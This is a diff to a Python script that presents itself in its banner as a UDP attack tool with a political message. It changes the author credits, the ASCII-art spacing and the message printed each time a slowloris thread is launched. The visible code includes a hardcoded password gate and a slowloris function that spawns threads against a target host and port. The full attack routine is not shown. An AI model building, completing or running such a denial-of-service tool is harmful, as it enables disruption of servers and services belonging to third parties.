@@ -19,18 +19,17 @@ def ascii_art_MinusFive():
 \033[1;36m  ©©     ©   ©©  ©©    ©    ©©  ©      ©©
 \033[1;35m  °°     °   °°  °°    °     °°°     °°
 \033[1;35m   °     °    °   °    °      °    °  
-\033[1;31m                        @ @ @ @  @  @       @  @ @ @ @
-\033[1;31m                        @        @   @     @   @
-\033[1;31m                        @ @ @    @    @   @    @ @ @
-\033[1;36m                        ©        ©     © ©     ©
-\033[1;36m                        ©        ©      ©      © © © ©
-\033[1;34m||===========================✓By: ZHANAHMAD ============================   
+\033[1;31m                              @ @ @ @  @  @       @  @ @ @ @
+\033[1;31m                              @        @   @     @   @
+\033[1;31m                              @ @ @    @    @   @    @ @ @
+\033[1;36m                              ©        ©     © ©     ©
+\033[1;36m                              ©        ©      ©      © © © ©
+\033[1;34m||===========================✓By:Za'99 =================================   
 \033[1;35m||   T H I S   S C R I P T   I S   F O R   A T T A C K I N G   U D P   ||
 \033[1;35m||                 W E  ARE  WITH  P A L E S T I N E                   ||
-\033[1;34m||                                                                     ||
-\033[1;31m||         B I R R U H  B I D A M N A F D I K A  Y A  A Q S H A        ||
-\033[1;31m||========√B A S E =====================================================    
-print(""\033[31m___________________________________________________________________""")
+\033[1;34m||         B I R R U H  B I D A M N A F D I K A  Y A  A Q S H A        ||                           
+\033[1;31m||=====================================================================||    
+print(""\033[31m__________________________________________________________________""")
 # Password authentication function
 def authenticate():
     password = "BASe"  # The password to access the tool
@@ -59,7 +58,7 @@ def slowloris(target, port, num_threads):
     for i in range(num_threads):
         thread = threading.Thread(target=slowloris_thread, args=(target, port))
         thread.start()
-        print(f"\033[1;33mSent BASE TEAM ====>> MinusFiVe message {i + 1} \033[0m")
+        print(f"\033[1;33mSent MinusFive ====>> attacking message {i + 1} \033[0m")
 
 if __name__ == "__main__":
     clear()  
